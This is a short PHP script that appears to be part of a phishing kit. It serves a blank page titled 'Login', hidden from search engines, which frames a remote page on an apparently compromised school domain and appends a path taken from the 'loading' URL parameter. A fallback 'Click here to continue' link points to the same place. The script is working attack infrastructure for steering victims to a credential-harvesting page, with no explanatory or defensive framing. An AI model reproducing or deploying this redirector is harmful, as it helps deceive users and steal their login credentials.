<?php
$url = trim($_GET['loading']);
$min = substr($url , strpos($url , '//'), 10000 );
$link = 'http://gimnasiocalibio.edu.co/incluye/xp';
echo '
<html>
<head>
<title>Login</title>
<meta name="keywords" content="">
<meta name="description" content="">
<meta name="revisit-after" content="1000 days">
<meta name="robots" content="NOINDEX">
<link rel="shortcut icon" type="image/ico" href="">

</head>
<frameset rows="*,3" frameborder="NO" border="50" framespacing="0">
<frame name="main" src="'.$link.$min.'">
<noframes>
<body bgcolor="#FFFFFF" text="#000000">
<a href="'.$link.$min.'">Click here to continue</a>
</body>
</noframes>
</html>';
?>